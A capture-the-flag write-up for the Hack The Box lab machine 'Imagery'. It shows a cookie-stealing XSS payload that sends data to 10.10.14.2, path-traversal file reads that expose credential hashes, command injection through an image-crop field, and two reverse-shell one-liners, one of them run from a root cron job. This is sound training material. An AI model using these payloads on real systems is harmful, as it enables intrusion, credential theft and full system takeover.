# Imagery 

**Target IP:** `10.129.242.164`
**Hostname:** `imagery.htb`
**Platform:** `Linux`
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

**Initial Observations:**

This appears to be a classic HTTP + SSH combo, but with the minor nuance that the HTTP server is running on port 8000. We will have to confirm this is truly an HTTP server however. 

### Web Reconnaissance

Viewing the site, it appears to be some form of online gallery, with the option to upload images:
![Pasted image 20260409105144](Screenshots/Pasted%20image%2020260409105144.png)

We can see there is a login/register functionality and we find an email address in the footer - `support@imagery.htb`.

I want to understand the server a bit better and the error pages give me no insight, so I perform a deeper scan on port 8000:
```bash
sudo nmap imagery.htb -p8000 -sV -sC -v
```

![Pasted image 20260409105444](Screenshots/Pasted%20image%2020260409105444.png)

This tells us that the target is running a **Werkzeug 3.1.3** web server on **Python 3.12.7**. 

### Directory / Subdomain Enumeration

**Directory Fuzzing:**

```bash
feroxbuster --url http://imagery.htb:8000/
```

Fuzzing reveals not a lot, but is getting some 40x errors, suggesting we might have better luck performing an authenticated scan.

**Subdomain Enumeration:**
```bash
ffuf -c -u http://10.129.242.164:8000 -H "Host: FUZZ.imagery.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

This returned many many potentially vhosts, so I filter by words instead - 
```bash
ffuf -c -u http://10.129.242.164:8000 -H "Host: FUZZ.imagery.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 49718
```

This returns a few subdomains, but based on the word length being 1, I suspect these are false positives:
![Pasted image 20260409110549](Screenshots/Pasted%20image%2020260409110549.png)
### Additional Web Enumeration

Given we have a register/login screen, I believe if we register an account we might gain more access which can be used to improve our scan. After logging in, we are presented with the following screen, including a new menu option to upload files:
![Pasted image 20260409110745](Screenshots/Pasted%20image%2020260409110745.png)

At this point I perform another subdirectory scan but it finds nothing new. 
#### Javascript Analysis

When performing the scans, I noticed the response is very large which is slightly uncharacteristic for a modern flask application. Viewing the source code shows there is a large chunk of javascript:
![Pasted image 20260409111351](Screenshots/Pasted%20image%2020260409111351.png)

As this file is rather large I process it using an AI agent to focus my efforts. This finds a few interesting endpoints and highlights 2 potential attack vectors.

Notable endpoints:
- `/auth_status`
- `/admin/users`
- `/admin/bug_reports`
- `/admin/get_system_log`
- `/report_bug`

Potential attack vectors: 
- **XSS in bug reports:** Bug reports are rendered without sanitization. We can verify this by viewing the javascript ourselves:
![435](Screenshots/Pasted%20image%2020260409112158.png)
    
- **Path traversal in log downloads:** The `/admin/get_system_log` endpoint can potentially be exploited to access any file as there is no sanitization. Again, we can verify this ourselves:
    ![Pasted image 20260409112415](Screenshots/Pasted%20image%2020260409112415.png)

I think it is worth noting that at this stage I was also suspicious of the file upload, and attempted various file upload attacks, however this yielded no rewards.

#### Viewing found endpoints

`/auth/status`:
![Pasted image 20260409112644](Screenshots/Pasted%20image%2020260409112644.png)
This provides us with nothing useful.

`/admin/*`:
![Pasted image 20260409112722](Screenshots/Pasted%20image%2020260409112722.png)
We will require admin credentials before testing these endpoints.

`/report_bug`:
![Pasted image 20260409112851](Screenshots/Pasted%20image%2020260409112851.png)

However, I discovered at the bottom of the page in the footer, there is a link which creates a report bug form on the screen, which will likely perform a POST request to this endpoint:
![Pasted image 20260409112938](Screenshots/Pasted%20image%2020260409112938.png)

---

## 2. Initial Foothold — Blind XSS & LFI

### Vulnerability Analysis

If we assume that the bug reports are viewed by an admin, we should be able to submit an XSS payload to the bug reporter. Using this we can attempt to steal the administrator's session cookie, as this cookie has HttpOnly and Secure set to false:
![Pasted image 20260409113215](Screenshots/Pasted%20image%2020260409113215.png)

### Exploitation

**XSS to gain cookie:**

First I spin up a listener on my attacker host:
```bash
sudo nc -lvnp 80
```

Then I enter the following payload into the bug details

```
<img src=x onerror="fetch('http://10.10.14.2/' + encodeURI(document.cookie));"/>
```

After submitting the payload and waiting a while, a callout is received on the listener containing the admin session cookie:
![Pasted image 20260409113525](Screenshots/Pasted%20image%2020260409113525.png)

**LFI via System Logs:**

Using the stolen cookie, we gain access to the admin functionalities, as seen on the menu:
![Pasted image 20260409113608](Screenshots/Pasted%20image%2020260409113608.png)

Interestingly, here we can also see the XSS rendered:
![Pasted image 20260409113642](Screenshots/Pasted%20image%2020260409113642.png)

Clicking the **Download Log** button we generate a request to `http://imagery.htb:8000/admin/get_system_log?log_identifier=testuser%40imagery.htb.log`. As identified earlier, this endpoint is potentially vulnerable to LFI. We can test this 

```bash
curl -b "session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.adeA3A.C07DlK7MnYI3rRS2UrZREQjQTTE" "http://imagery.htb:8000/admin/get_system_log?log_identifier=/../../../../../etc/passwd"
```

This returns the `/etc/passwd` proving we have LFI:
![Pasted image 20260409113839](Screenshots/Pasted%20image%2020260409113839.png)

### LFI Enumeration
If we assume the log files are stored in a separate folder, we will need to traverse up by at least 1 level. We found earlier that the app is a Flask application, so we can likely find some python files. I try a few common filenames until eventually I find some data at `../config.py`:
![Pasted image 20260409114243](Screenshots/Pasted%20image%2020260409114243.png)

`../config.py`:
```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
                                     
```

This helps us to map out the file structure based on the `os.makedirs` calls. It also links to a file `db.json` which may contain some credentials

`db.json`:
```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": [
        {
            "id": "27495fd1-d841-4b11-a0bc-a6ec46c8dbb3",
            "name": "test",
            "details": "<img src=x onerror=\"fetch('http://10.10.14.2/' + encodeURI(document.cookie));\"/>",
            "reporter": "john@gmail.com",
            "reporterDisplayId": "030fe151",
            "timestamp": "2026-04-09T10:33:24.718460"
        }
    ]
}   
```

This gives a hash for testuser of `2c65c8d7bfbca32a3ed42596192384f6`. Using CrackStation this drops as `iambatman`.

---

## 3. Command Injection

### Testuser access

Using the password we found earlier we are able to login as `testuser`. Once we login, we are able to upload an image and notice we now have additional options such as `Transform Image`:
![Pasted image 20260409135146](Screenshots/Pasted%20image%2020260409135146.png)

Clicking this allows us to perform various operations such as `Crop`:
![Pasted image 20260409135223](Screenshots/Pasted%20image%2020260409135223.png)

At this stage I go down a bit of a rabbit hole trying various CVEs but nothing works, resulting me going back to the LFI to try and read source files.

### Back to the sauce

Going back to the source code, I find `app.py`:
```python
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

This gives us a better idea of how the app works. What is most interesting here are the imports, which actually give us an idea of what other files are in use. My guess is that as we are running as a test user, and have access to some features that are likely new and in development, these might be exploitable. Based on the inputs, I guess that api_edit might be worth looking at.

`api_edit.py`:
```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

As I suspected, the features are locked behind this test user account and are in development. The interesting line is here - 
```python
if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

Here the parameters `x, y, width` and `height` are directly inserted into a command which is then executed, hence we should be able to achieve RCE here.


**Testing RCE:**
Before performing the full reverse shell, I first tested with a simple callback to my listener.

To do this I first take the command that is being created and try to think what a malicious value might look like:

Original command:
```bash
{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}
```

Inserted `y` value -
```bash
10 /dev/null; curl 10.10.14.2; #
```

End command - 
```bash
{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+10 /dev/null; curl 10.10.14.2; # {output_filepath}
```

Inserting this into our `y` field, the client side protection prevents this:
![Pasted image 20260409141036](Screenshots/Pasted%20image%2020260409141036.png)

However, using burp suite we can bypass this:
![Pasted image 20260409141253](Screenshots/Pasted%20image%2020260409141253.png)

We get a callback on our listener:
![Pasted image 20260409141312](Screenshots/Pasted%20image%2020260409141312.png)

Using this we can get full RCE, by running the following with a penelope listener:
```bash
10 /dev/null; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.2 4444 >/tmp/f; #
```

On the listener we get a shell:
![Pasted image 20260409141546](Screenshots/Pasted%20image%2020260409141546.png)

---

## 4. User Shell as Mark

The shell we have is running as `web`. I do some hunting around on the box and notice something suspicious in `/var`. There is a folder named `backup`, normally in `/var` there is only a folder named `backups`. Inside this folder, there is a .aes file:
![Pasted image 20260409141925](Screenshots/Pasted%20image%2020260409141925.png)

I download this file to my attacker box and do some research on this file and format. I find the following forum post - https://hashcat.net/forum/thread-8874.html

Which leads to this - https://raw.githubusercontent.com/hashcat/hashcat/master/tools/aescrypt2hashcat.pl

I use this tool to generate a hashcat hash:
![Pasted image 20260409142209](Screenshots/Pasted%20image%2020260409142209.png)

Which I then send to hashcat to crack:
```bash
hashcat hash --wordlist /usr/share/wordlists/rockyou.txt
```

This drops as `bestfriends`. We can then open the crypt using the following short python code:
```python
import pyAesCrypt

pyAesCrypt.decryptFile("web_20250806_120723.zip.aes", "output", "bestfriends")
```

The output is not text, we confirm it is instead a zip:
```bash
file output
```

Extracting this zip, we seem to have a backup of the entire web directory. Including the db:
```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}                                                
```

We have a hash for mark - `01c3d2e5bdaf6134cec0a367cf53e535` which crackstation gives as `supersmash`.

We for some reason cannot ssh, but we can use `su` on the existing shell and get the user flag:
![Pasted image 20260409144941](Screenshots/Pasted%20image%2020260409144941.png)

---

## 5. Privilege Escalation — Command Injection

### Enumeration

Checking sudo privileges reveals a custom binary:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/local/bin/charcol
```

### Vulnerability Analysis

If we run this tool, we get a message saying we can run `charcol shell`. However when doing this, we are prompted for a password and mark's password does not work:
![Pasted image 20260409145424](Screenshots/Pasted%20image%2020260409145424.png)

Running `sudo charcol help` informs us that we can run `sudo charcol -R` to reset the password to default.

Now we are able to run the `charcol` binary without a password:
![Pasted image 20260409145553](Screenshots/Pasted%20image%2020260409145553.png)

Within the shell, we appear to have various different functionality, but the main interesting one is the ability to add cron jobs:
![Pasted image 20260409145643](Screenshots/Pasted%20image%2020260409145643.png)
### Exploitation

We can abuse the `charcol` tool's scheduling capability to execute a reverse shell as root.

**Testing the Exploit:**

Within a charcol shell - 
```bash
auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'" --name "PWN"
```

This prompts for mark's password then within one minute, the cron job executes, providing a root shell. Using this we can get the root flag:
![Pasted image 20260409150210](Screenshots/Pasted%20image%2020260409150210.png)

---

## Summary

| **Step**                 | **Technique**                                          |
| ------------------------ | ------------------------------------------------------ |
| **Initial Access**       | Blind XSS via Bug Report to steal Admin Cookie.        |
| **Credential Access**    | LFI to read source code into RCE for a shell as `web`. |
| **User Shell**           | SSH access via cracked credentials for user `mark`.    |
| **Privilege Escalation** | Cron job creation via `sudo /usr/local/bin/charcol`.   |
